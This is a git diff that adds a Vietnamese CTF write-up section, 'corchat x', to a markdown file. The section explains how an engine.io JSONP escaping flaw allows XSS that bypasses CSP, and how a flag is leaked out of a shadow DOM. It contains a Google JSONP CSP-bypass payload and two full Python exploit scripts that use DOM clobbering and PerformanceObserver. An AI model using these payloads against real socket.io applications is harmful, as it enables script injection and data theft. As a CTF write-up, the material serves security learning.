@@ -198,5 +198,227 @@ Sau khi response đã có trong cache ta có thể trigger disk cache để xss,
 ```
 
 Đầu tiên ta sẽ cho browser open 1 tab mới và truy cập đến `/data:text/javascript,alert(1)/iframe/view` để tạo 1 entry history, tiếp đó redirect tab đó đến URL chứa payload ở query string nhằm pollute prototype `Object` và fetch đến `/data:text/javascript,alert(1)/iframe/view`, lúc này thì ban đầu ta đã có một history của url `/data:text/javascript,alert(1)/iframe/view` rồi, cộng với việc response khi fetch đến `/data:text/javascript,alert(1)/iframe/view` lần này khác với lần đầu nếu browser sẽ invalidate cache cũ và đẩy cache mới vào, lúc này ta chỉ cần `history.go(-2)` để lùi history về 2 entry (entry của `/data:text/javascript,alert(1)/iframe/view`) và trigger disk cache đã lưu để trang được render và các script sẽ bắt đầu chạy
-## corchat x (PENDING)
+## corchat x 
+
+![image](https://github.com/user-attachments/assets/375f2567-c3f4-4edc-a546-a85cbfd40db8)
+
+Another shadow dom challenge, một ứng dụng chat sử dụng socket, ta sẽ cần bằng cách nào đó exfiltrate được flag nằm trong `src` của tag `img` bên trong một shadow dom và nằm trong một `about:blank` origin được mở bằng `window.open`
+
+Core concept của bài này đó là engine.io (engine được sử dụng bởi socket.io) sử dụng JSONP để broadcast message đến các socket
+
+![image](https://github.com/user-attachments/assets/778857dd-17d6-46cf-b90e-f4524ead590c)
+
+Cùng nhìn qua CSP của bài 
+
+![image](https://github.com/user-attachments/assets/27e54170-49f0-4d12-b39b-18990babdcec)
+
+Vậy ta có thể dùng cách `<script src="/socket.io/?EIO=4&transport=polling&t=bingus&sid=<sid>&j=0"></script>`
+
+### JSONP
+
+JSONP là giải pháp để truyền tải JSON và "bypass" qua SOP, consumer chỉ cần setup 1 thẻ script trỏ src đến API endpoint, API endpoint này sẽ trả về một response chứa một đoạn JSON được wrap bởi một đoạn JS dùng để sử lý đoạn JSON đó. Cách này tiện cho cả developer và attack khi mà nó đã từng nhiều lần được sử dụng để bypass CSP:
+
+```html
+<script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+```
+
+Với payload như trên ta sẽ bypass qua được các CSP dạng `script-src 'self' https://*.google.com/`. Vậy quay lại bài trên, ta có thể thiết lập một socket connection, lấy sid thế vào URL bên trên kia rồi trỏ script src vào, nhưng như thế thì chưa đủ vì theo lẽ thông thường thì JSON sẽ được escape nên ta cũng không thể chèn JS vào trong đoạn JSONP được... nhưng trường hợp của engineio thì khác, cùng quan sát khi mình gửi `\" aaa`
+
+![image](https://github.com/user-attachments/assets/33c9ddf3-efcf-4a42-adf0-4f8d0f9af0ed)
+
+Mình sẽ simulate lại sau khi data đi qua 1 hàm escape: 
+
+![image](https://github.com/user-attachments/assets/7965e476-e920-424c-8d5e-a1b7af9abb0d)
+
+Khá rõ ràng, dấu `\` ban nãy dường như đã bị engineio escape sai, vậy làm sao để ta lợi dùng điều này? Tạo 2 socket session, emit payload ở `\" + alert(1));` ở session 1, session 2 sẽ dùng để trỏ script src đến polling endpoint của socketio, cụ thể như sau (original author: `Trixter`)
+
+```py
+import socketio
+import requests
+import time
+import json
+
+base_url = "http://localhost:8080"
+
+def create_sid():
+    session = requests.Session()
+    login = session.post(f'{base_url}/', data = {}, allow_redirects=False)
+    assert login.status_code == 302, login.status_code
+
+    res = session.get(f'{base_url}/socket.io/', params = {
+        'EIO': 4,
+        'transport': 'polling',
+        't': 'bingus',
+    })
+    assert res.status_code == 200, res.status_code
+
+    socket_session = json.loads(res.text[1:])
+    print('fake session', socket_session)
+
+    res = session.post(f'{base_url}/socket.io/', params = {
+        'EIO': 4,
+        'transport': 'polling',
+        't': 'P3qHGUZ',
+        'sid': socket_session['sid'],
+    }, data = b'40')
+    assert res.status_code == 200, res.status_code
+
+    return socket_session['sid']
+
+bot_session = requests.Session()
+login = bot_session.post(f'{base_url}/', data = {
+    'name': 'FizzBuzz101',
+}, allow_redirects=False)
+assert login.status_code == 302, login.status_code
+
+sio = socketio.Client(http_session=bot_session)
+ready = False
+
+@sio.event
+def connect():
+    global ready
+
+    print('connected!')
+
+    # fake disconnect event so that the bot can connect as well
+    sio.emit('disconnect')
+    time.sleep(1)
+    ready = True
+    print('ready for bot!')
+
+@sio.event
+def message(data):
+    global ready
+
+    if not ready:
+        return
+
+    print('message', data)
+    if data['content'] == 'FizzBuzz101 joined.': # XSS bot opened the chat
+        sid = create_sid()
+        jsonp_url = f'{base_url}/socket.io/?EIO=4&transport=polling&t=bingus&sid={sid}&j=0'
+        js_payload = "(alert(origin))"
+
+        sio.emit('message', '\\"+'+js_payload+');//')
+
+        xss_payload = """
+<a id=&quot;___eio&quot;></a>
+<script src=&quot;%s&quot;></script>
+""" % jsonp_url
+        chat_message = '<iframe id="xss" srcdoc="%s"></iframe>' % xss_payload.strip()
+        sio.emit('message', chat_message)
+
+sio.connect(base_url)
+sio.wait()
+```
+
+trước khi emit lần 2, ta wrap payload vào trong `srcdoc` của iframe để tag `script` có thể chạy, đối với dòng `<a id=&quot;___eio&quot;></a>` thì mục đích là để thông qua DOM clobbering khởi tạo biến `__eio` để khi chạy payload sẽ không bị báo lỗi vì lúc này `__eio` chưa được khai báo (smart :O)
+
+![image](https://github.com/user-attachments/assets/9b7f7a1a-d627-47bc-a539-78649cadbfa2)
+
+### Leaking flag with PerformanceObserver
+
+Trong giải mình có attemp bài này và hướng của mình là thông qua CSS để để leak flag, do đó mà mình đọc spec cũng như source chromium thì mình có tìm ra được là có một CSS combinator gọi là `/deep/` có khả năng chọc xuyên Shadow DOM, nhưng từ sớm đã bị deprecated và removed khỏi google chrome, shame. Quay trở lại bài, original solution của `Trixter` đã split XSS thành 2 stage để bypass qua giới hạn độ dài payload 400 bytes, stage 1 thực hiện `open('', 'secret')` để lấy reference đến tab `secret` chứa flag, tiếp theo là tiếp tục include script của stage 2. Ở stage 2 thì `Trixter` sử dụng một API là `PerformanceObserver` để để leak flag thông qua việc truy xuất vào url của các resource entry
+
+![image](https://github.com/user-attachments/assets/50d32afd-7ed6-4c5d-a75c-325bbcd3c766)
+
+API này cho phép ta truy cập vào tất cả các resource đã load cũng như các thông số về performance khi load của resource đó (quite powerful), full script:
+
+```py
+import socketio
+import requests
+import time
+import json
+
+base_url = "http://localhost:8080"
+
+def create_sid():
+    session = requests.Session()
+    login = session.post(f'{base_url}/', data = {}, allow_redirects=False)
+    assert login.status_code == 302, login.status_code
+
+    res = session.get(f'{base_url}/socket.io/', params = {
+        'EIO': 4,
+        'transport': 'polling',
+        't': 'bingus',
+    })
+    assert res.status_code == 200, res.status_code
+
+    socket_session = json.loads(res.text[1:])
+    print('fake session', socket_session)
+
+    res = session.post(f'{base_url}/socket.io/', params = {
+        'EIO': 4,
+        'transport': 'polling',
+        't': 'P3qHGUZ',
+        'sid': socket_session['sid'],
+    }, data = b'40')
+    assert res.status_code == 200, res.status_code
+
+    return socket_session['sid']
+
+bot_session = requests.Session()
+login = bot_session.post(f'{base_url}/', data = {
+    'name': 'FizzBuzz101',
+}, allow_redirects=False)
+assert login.status_code == 302, login.status_code
+
+sio = socketio.Client(http_session=bot_session)
+ready = False
+
+@sio.event
+def connect():
+    global ready
+
+    print('connected!')
+
+    # fake disconnect event so that the bot can connect as well
+    sio.emit('disconnect')
+    time.sleep(1)
+    ready = True
+    print('ready for bot!')
+
+@sio.event
+def message(data):
+    global ready
+
+    if not ready:
+        return
+
+    print('message', data)
+    if data['content'] == 'FizzBuzz101 joined.': # XSS bot opened the chat
+        first_sid = create_sid()
+        js_payload = """
+(window.exfil = data => window.top.opener.top.socket.emit('message', data))
+(window.observer = new parent.PerformanceObserver((list) => { list.getEntries().forEach((entry) => { window.exfil('Flag: ' + decodeURIComponent(entry.name.split('/').pop())); }); }))
+(window.observer.observe({ type: 'resource', buffered: true }))
+""".strip().replace('\n', ',')
+        sio.emit('message', '\\"+'+js_payload+');//')
+
+        second_sid = create_sid()
+        jsonp_url = f'{base_url}/socket.io/?EIO=4&transport=polling&t=bingus&sid={second_sid}&j=0'
+        js_payload = """
+(window.secret=window.open('','secret'))
+(window.a=window.top.document.getElementById('xss').cloneNode())
+(window.a.srcdoc=window.a.srcdoc.replace('%s','%s'))
+(window.secret.document.body.appendChild(window.a))
+""".strip().replace('\n', ',') % (second_sid, first_sid)
+
+        sio.emit('message', '\\"+'+js_payload+');//')
+
+        xss_payload = """
+<a id=&quot;___eio&quot;></a>
+<a id=&quot;___eio&quot;></a>
+<script src=&quot;%s&quot;></script>
+""" % jsonp_url
+        chat_message = '<iframe id="xss" srcdoc="%s"></iframe>' % xss_payload.strip()
+        assert len(chat_message) < 400, 'chat message too long, time to write better payload'
+        sio.emit('message', chat_message)
+
+sio.connect(base_url)
+sio.wait()
+```
+
+![image](https://github.com/user-attachments/assets/d947da00-c9e4-4d52-b86e-1b34f37c8a77)
+
 ## repayment-pal (PENDING)
